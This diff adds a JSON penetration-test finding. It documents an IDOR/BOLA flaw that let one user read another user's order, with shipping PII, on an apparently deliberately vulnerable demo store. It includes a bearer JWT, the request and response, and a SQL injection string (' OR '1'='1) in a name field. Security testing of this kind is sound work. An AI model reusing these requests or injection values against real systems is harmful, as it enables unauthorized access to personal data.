@@ -1,0 +1,56 @@
+{
+  "vulnerability": "IDOR/BOLA on /api/v1/orders/{id}",
+  "target": "https://duck-store.escape.tech/api/v1/orders/9",
+  "proof": {
+    "user_b_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMTk3OWRhNjgtNzMzNS00ZTdhLWEzMmUtYWU5ZDVlOTA3NTk2IiwidXNlcm5hbWUiOiJ1c2VyX2JfMDAxIiwicm9sZSI6InVzZXIiLCJleHAiOjE3OTA2NDcxNDF9.HimXkMB6-ISFzFcW56DBNFVIAOH6uldXNEHQJjuZY1A",
+    "user_b_user_id": "1979da68-7335-4e7a-a32e-ae9d5e907596",
+    "request": "GET /api/v1/orders/9 with user_b's Authorization header",
+    "response_code": 200,
+    "response_body": {
+      "id": 9,
+      "user_id": "cb4dbfeb-f5da-49a2-b0d9-ac0e15635d5d",
+      "total_price": 15.98,
+      "status": "processing",
+      "items": [
+        {
+          "product_id": 1,
+          "quantity": 1,
+          "price": 9.99,
+          "id": 15,
+          "product": {
+            "name": "Classic Yellow Duck",
+            "description": "The timeless classic rubber duck that started it all!",
+            "price": 9.99,
+            "stock": 91,
+            "color": "Yellow",
+            "material": "Rubber",
+            "size": "Medium",
+            "image_url": "/static/products/classic-duck.png",
+            "id": 1,
+            "created_at": "2026-09-29T01:39:08.237534"
+          }
+        }
+      ],
+      "created_at": "2026-09-29T02:28:36.814019",
+      "shipping_first_name": "Test",
+      "shipping_last_name": "' OR '1'='1",
+      "shipping_address": "123 Test St",
+      "shipping_city": "Test City",
+      "shipping_zip": "12345",
+      "shipping_country": "US",
+      "shipping_phone": "555-1234",
+      "shipping_method": "standard",
+      "shipping_cost": 5.99,
+      "estimated_delivery": "2026-10-06T02:28:36.806811"
+    },
+    "put_response": {
+      "code": 405,
+      "body": "{\"detail\":\"Method Not Allowed\"}"
+    },
+    "delete_response": {
+      "code": 405,
+      "body": "{\"detail\":\"Method Not Allowed\"}"
+    }
+  },
+  "analysis": "user_b (user_id: 1979da68-7335-4e7a-a32e-ae9d5e907596) successfully accessed order ID 9 which belongs to user_id: cb4dbfeb-f5da-49a2-b0d9-ac0e15635d5d (a different user). This confirms cross-user order disclosure via IDOR/BOLA. The response contains full order details including PII (shipping name, address, phone). PUT and DELETE correctly return 405 Method Not Allowed."
+}
